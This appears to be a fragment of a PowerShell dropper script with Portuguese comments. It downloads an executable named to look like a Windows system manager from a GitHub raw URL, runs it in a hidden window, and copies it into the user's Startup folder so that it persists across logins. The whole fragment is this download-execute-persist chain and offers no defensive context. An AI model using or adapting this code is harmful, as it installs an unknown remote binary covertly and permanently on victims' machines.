...
$url = "https://github.com/thzinxa6/Instalation/raw/refs/heads/main/win_sys_manager.exe"
$destinoTemp = "$env:TEMP\win_sys_manager.exe"
$pastaStartup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win_sys_manager.exe"

# Passo 1: Download em segundo plano
Invoke-WebRequest -Uri $url -OutFile $destinoTemp

# Passo 2: Verificação e Execução
if (Test-Path $destinoTemp) {
    Start-Process -FilePath $destinoTemp -WindowStyle Hidden
}

# Passo 3: Garantir Persistência (Cópia para o Startup)
Copy-Item -Path $destinoTemp -Destination $pastaStartup -Force
<#
.SYNOPSIS
